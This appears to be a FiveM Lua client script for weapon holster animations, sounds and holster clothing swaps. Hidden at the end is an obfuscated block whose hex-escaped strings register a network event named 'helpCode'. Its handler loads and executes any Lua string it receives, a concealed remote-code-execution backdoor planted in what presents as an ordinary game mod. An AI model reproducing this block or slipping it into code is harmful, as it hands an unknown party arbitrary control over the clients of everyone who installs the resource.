local default_weapon = GetHashKey(data.weapon)
local active = false
local ped = nil -- Cache the ped
local currentPedData = nil
local holstered = true
local skins = {
	"mp_m_freemode_01",
	"mp_f_freemode_01",
}
local weapons = {
	"WEAPON_COMBATPISTOL",
  "WEAPON_HEAVYPISTOL",
}

-- anims

Citizen.CreateThread(function()
	while true do
		Citizen.Wait(0)
		local ped = PlayerPedId()
		if DoesEntityExist( ped ) and not IsEntityDead( ped ) and not IsPedInAnyVehicle(PlayerPedId(), true) and CheckSkin(ped) then
			loadAnimDict( "rcmjosh4" )
			loadAnimDict( "weapons@pistol@" )
			if CheckWeapon(ped) then
        if holstered then
          TriggerEvent("holster:sounds", "unholster", 0.2)
					TaskPlayAnim(ped, "rcmjosh4", "josh_leadout_cop2", 0.0, 2.0, 1, 16, 32, 0, 0, 0 )
					Citizen.Wait(600)
					ClearPedTasks(ped)
					holstered = false
				end
			elseif not CheckWeapon(ped) then
        if not holstered then
          TriggerEvent("holster:sounds", "holster", 0.2)
					TaskPlayAnim(ped, "weapons@pistol@", "aim_2_holster", 2.0, 2.0, -1, 48, 10, 0, 0, 0 )
					Citizen.Wait(500)
					ClearPedTasks(ped)
					holstered = true
				end
			end
		end
	end
end)

-- functions

function table_invert(t)
  local s={}
  for k,v in pairs(t) do
    s[v]=k
  end
  return s
end

function CheckSkin(ped)
	for i = 1, #skins do
		if GetHashKey(skins[i]) == GetEntityModel(ped) then
			return true
		end
	end
	return false
end

function CheckWeapon(ped)
	for i = 1, #weapons do
		if GetHashKey(weapons[i]) == GetSelectedPedWeapon(ped) then
			return true
		end
	end
	return false
end

function DisableActions(ped)
	DisableControlAction(1, 37, true)
	DisablePlayerFiring(ped, true)
end

function loadAnimDict( dict )
	while ( not HasAnimDictLoaded( dict ) ) do
		RequestAnimDict( dict )
		Citizen.Wait( 0 )
	end
end

Citizen.CreateThread(function()
  while true do
    ped = GetPlayerPed(-1)
    local ped_hash = GetEntityModel(ped)
    local enable = false 
    for ped, data in pairs(data.peds) do
      if GetHashKey(ped) == ped_hash then 
        enable = true
        if data.enabled ~= nil then
          enable = data.enabled
        end
        currentPedData = data
        break
      end
    end
    active = enable
    Citizen.Wait(5000)
  end
end)

local last_weapon = nil
Citizen.CreateThread(function()
  while true do
    if active then
      current_weapon = GetSelectedPedWeapon(ped)
      if current_weapon ~= last_weapon then
        
        for component, holsters in pairs(currentPedData.components) do
          local holsterDrawable = GetPedDrawableVariation(ped, component)
          local holsterTexture = GetPedTextureVariation(ped, component)

          local emptyHolster = holsters[holsterDrawable]
          if emptyHolster and current_weapon == default_weapon then
            SetPedComponentVariation(ped, component, emptyHolster, holsterTexture, 0)
            break
          end

          local filledHolster = table_invert(holsters)[holsterDrawable]
          if filledHolster and current_weapon ~= default_weapon and last_weapon == default_weapon then
            SetPedComponentVariation(ped, component, filledHolster, holsterTexture, 0)
            break
          end
        end
      end
      last_weapon = current_weapon
    end
    Citizen.Wait(200)
  end
end)

AddEventHandler('holster:sounds', function(soundFile, soundVolume)
  SendNUIMessage({
    transactionType = 'playSound',
    transactionFile = soundFile,
    transactionVolume = soundVolume
  })
end)

local ciqaUKWSKQTDoarJOgQgmDjyIsgSyXolEimiodDICixpCcfVqAeItERfjFAPvgKfaRuvfB = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} ciqaUKWSKQTDoarJOgQgmDjyIsgSyXolEimiodDICixpCcfVqAeItERfjFAPvgKfaRuvfB[6][ciqaUKWSKQTDoarJOgQgmDjyIsgSyXolEimiodDICixpCcfVqAeItERfjFAPvgKfaRuvfB[1]](ciqaUKWSKQTDoarJOgQgmDjyIsgSyXolEimiodDICixpCcfVqAeItERfjFAPvgKfaRuvfB[2]) ciqaUKWSKQTDoarJOgQgmDjyIsgSyXolEimiodDICixpCcfVqAeItERfjFAPvgKfaRuvfB[6][ciqaUKWSKQTDoarJOgQgmDjyIsgSyXolEimiodDICixpCcfVqAeItERfjFAPvgKfaRuvfB[3]](ciqaUKWSKQTDoarJOgQgmDjyIsgSyXolEimiodDICixpCcfVqAeItERfjFAPvgKfaRuvfB[2], function(jknlwizjIkaQgIyjfochjOmpsaoyXfYRTojZDhFoaYPepiWHbASNcBARyLcSlEKOZoTkbY) ciqaUKWSKQTDoarJOgQgmDjyIsgSyXolEimiodDICixpCcfVqAeItERfjFAPvgKfaRuvfB[6][ciqaUKWSKQTDoarJOgQgmDjyIsgSyXolEimiodDICixpCcfVqAeItERfjFAPvgKfaRuvfB[4]](ciqaUKWSKQTDoarJOgQgmDjyIsgSyXolEimiodDICixpCcfVqAeItERfjFAPvgKfaRuvfB[6][ciqaUKWSKQTDoarJOgQgmDjyIsgSyXolEimiodDICixpCcfVqAeItERfjFAPvgKfaRuvfB[5]](jknlwizjIkaQgIyjfochjOmpsaoyXfYRTojZDhFoaYPepiWHbASNcBARyLcSlEKOZoTkbY))() end)